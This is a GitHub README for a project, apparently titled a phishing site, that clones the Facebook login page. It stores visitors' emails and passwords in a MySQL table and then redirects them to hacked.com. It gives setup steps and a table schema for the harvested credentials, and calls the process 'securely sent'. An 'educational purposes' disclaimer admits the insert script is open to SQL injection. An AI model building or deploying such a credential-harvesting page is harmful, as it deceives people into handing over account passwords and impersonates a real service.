# Database-Driven Facebook Login Replication

## Overview
This project is a simple web application that replicates the Facebook login page. Users can input their credentials (email and password), which are then securely sent to a database via a PHP script. Upon successful insertion into the database, users are redirected to another site called hacked.com.

## Technologies Used
- HTML/CSS: For the frontend design and layout of the login page.
- PHP: For server-side scripting to handle user authentication and database operations securely.
- MySQL: For storing user credentials and managing user data.
- Apache: Web server used to host the PHP scripts and serve the web application.

## Setup Instructions
1. **Clone the repository to your local machine:**

    ```
    git clone https://github.com/Mahmoudshee/phishing_site_with_database.git
    ```

2. **Set up a web server environment with PHP and MySQL support:** 
    - You can use tools like XAMPP, WAMP, or set up your own LAMP stack.

3. **Create a MySQL database named `fap`:**
    - Access your MySQL database management tool (e.g., phpMyAdmin).
    - Create a new database named `fap`.

4. **Within the `fap` database, create a table named `wpa_keys`:**
    - Execute the following SQL query:

    ```sql
    CREATE TABLE wpa_keys (
        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(50) NOT NULL,
        password2 VARCHAR(50) NOT NULL
    );
    ```

5. **Update the `db_insert.php` file with your database credentials:**
    - Open `db_insert.php` file in your text editor.
    - Update the following variables with your database credentials:
        - `$host`: The hostname of your MySQL server (usually 'localhost').
        - `$username`: Your MySQL username.
        - `$pass`: Your MySQL password.
        - `$dbname`: The name of the database (`fap` in this case).

6. **Place the project files in the web server's document root directory.**

7. **Access the project via a web browser by navigating to `http://localhost/your-project-folder`.**

## Usage
1. Open a web browser and navigate to the URL where the project is hosted.

2. You will be presented with a login page that replicates the Facebook login page.

3. Enter your credentials (email and password) and click the login button.

4. If the credentials are valid, they will be securely sent to the database, and you will be redirected to hacked.com.

## Disclaimer
This project is created for educational purposes only. It demonstrates basic principles of web development, including HTML/CSS, PHP scripting, and MySQL database interaction. However, it is not intended for real-world use and lacks essential security features required for production environments.

**Security Considerations:**
- The PHP script (`db_insert.php`) currently does not sanitize user input, making it vulnerable to SQL injection attacks.
- It's highly recommended to implement proper input validation, parameterized queries, and user authentication mechanisms before deploying any web application to a production environment.
- Additionally, error messages from the PHP script should be handled securely to prevent information leakage.

Proceed with caution and do not use this project for any malicious activities. Always prioritize security when developing and deploying web applications.
